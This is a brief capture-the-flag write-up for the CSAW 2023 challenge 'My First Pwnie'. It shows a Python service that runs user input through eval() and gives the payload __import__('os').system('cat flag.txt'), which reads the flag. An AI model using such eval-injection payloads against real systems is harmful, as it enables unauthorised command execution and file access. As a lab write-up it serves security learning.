
# My First Pwnie
We are given nc command and the python src file.
```
nc intro.csaw.io 31137
```
Here's a look at the output

![](https://github.com/0xNev/CTF-Writeups/blob/main/csaw23/my_first_pwnie/1.png?raw=true)


The program asks for a password, not sure what else so lets take a look the src file.
  
```python
try:
	response = eval(input("What's the password? "))
	print(f"You entered `{response}`")
if response == "password":
	print("Yay! Correct! Congrats!")
	quit()
except:
	pass

print("Nay, that's not it.")
```
The program is checking if the password is equal to 'password' and if so it quits the application.

It is important to notice that the input is being run on a eval, running eval on an input we control is dangerous.

By crafting a malicious input we could possibly gain control over the machine, so lets try that.

After some testing I got the following to work for me
```python
__import__("os").system("cat flag.txt")
```


![](https://github.com/0xNev/CTF-Writeups/blob/main/csaw23/my_first_pwnie/2.png?raw=true)

 
